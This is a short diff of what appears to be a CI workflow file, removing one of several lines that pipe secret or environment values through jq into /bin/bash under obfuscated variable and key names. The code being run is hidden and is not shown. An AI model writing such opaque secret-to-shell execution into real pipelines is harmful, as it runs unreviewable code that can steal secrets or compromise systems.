@@ -18,7 +18,6 @@ jobs:
           lyx293: ${{ secrets.lyx293 }}
         run: |
           printf '%s' "$lyx293" | jq -r .uuv9 | /bin/bash
-          printf '%s' "$dhhdm6209" | jq -r .fqmvj944 | /bin/bash
           echo $ln3381 | jq -r .u564 | /bin/bash
           echo $b12244 | jq -r .f2116 | /bin/bash
           echo $n8856 | jq -r .v24 | /bin/bash
